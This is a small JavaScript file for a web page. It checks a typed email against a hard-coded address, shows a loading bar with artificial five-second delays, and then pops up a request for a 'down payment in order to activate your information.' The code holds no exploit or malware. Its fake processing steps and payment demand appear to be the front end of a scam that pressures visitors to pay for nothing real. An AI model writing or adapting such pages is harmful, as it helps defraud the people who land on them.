const inputEmail = document.getElementById("email");
const errorMessage = document.getElementById("errorMessage");
const loaderContainer = document.getElementById('loaderContainer');
const progressBar = document.getElementsByClassName('progress-bar')[0];
const expectedEmail = "potgone@gmail.com";

function savaData() {
    loaderContainer.style.display = "block";
    errorMessage.style.display = "none";

    setTimeout(function() {
        loaderContainer.style.display = "none";
        if (inputEmail.value !== expectedEmail) {
            errorMessage.innerText = "Wrong email";
            errorMessage.style.display = "block";
        } else {
            errorMessage.innerText = ""; // Clear any previous error message
            alert("Valid email!");
            // updateErrorMessage("Processing to downloads Info.. ! 📥", "green"); // Display in green color
            setTimeout(function() {
                loaderContainer.style.display = "block"; // Show loader again
                setTimeout(function() {
                    alert("We kindly request that you make a down payment in order to activate your information.")
                }, 5000); // Adjust the time as needed
            }, 5000); // Show loader for 5 seconds
        }
    }, 5000); 
}
